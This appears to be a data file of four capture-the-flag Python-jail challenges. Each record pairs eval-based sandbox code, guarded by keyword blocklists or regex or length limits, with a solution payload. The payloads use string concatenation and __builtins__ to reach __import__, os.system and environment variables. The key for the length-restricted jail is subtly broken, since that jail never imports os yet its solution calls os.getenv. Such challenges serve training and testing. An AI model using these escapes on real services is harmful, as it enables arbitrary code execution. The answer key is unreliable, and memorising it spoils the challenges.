{"name": "Basic PyJail", "category": "pwn", "description": "Can you break out of this simple PyJail?", "source_code": "Basic PyJail\n###START\nimport os\ndef jail(user_input):\n    banned = ['eval', 'exec', 'import', 'open', 'os', 'read', 'write']\n    if any(word in user_input for word in banned):\n        return \"Nice try!\"\n    return eval(user_input)\n###END\nCan you break out of this simple PyJail?", "solution": "getattr(getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('echo $FLAG')"}
{"name": "Regex PyJail", "category": "pwn", "description": "This PyJail uses regex. Can you bypass it?", "source_code": "Regex PyJail\n###START\nimport re\ndef jail(user_input):\n    if re.search(r'[A-Z]', user_input):\n        return \"No uppercase letters allowed!\"\n    return eval(user_input)\n###END\nThis PyJail uses regex. Can you bypass it?", "solution": "__builtins__.__import__('os').environ['flag'.upper()]"}
{"name": "Length-Restricted PyJail", "category": "pwn", "description": "Short and sweet. Can you break out in under 20 characters?", "source_code": "Length-Restricted PyJail\n###START\ndef jail(user_input):\n    if len(user_input) > 20:\n        return \"Too long! Keep it under 20 characters.\"\n    return eval(user_input)\n###END\nShort and sweet. Can you break out in under 20 characters?", "solution": "os.getenv('FLAG')"}
{"name": "Nested PyJail", "category": "pwn", "description": "It's a jail within a jail. Double the fun!", "source_code": "Nested PyJail\n###START\ndef inner_jail(input):\n    banned = ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']\n    if any(word in input for word in banned):\n        return \"Nice try!\"\n    return eval(input)\n\ndef jail(user_input):\n    if len(user_input) > 80:\n        return \"Too long! Keep it under 80 characters.\"\n    return inner_jail(user_input)\n###END\nIt's a jail within a jail. Double the fun!", "solution": "getattr(globals()['__builtins__'],'__im'+'port__')('o'+'s').getenv('FLAG')"}
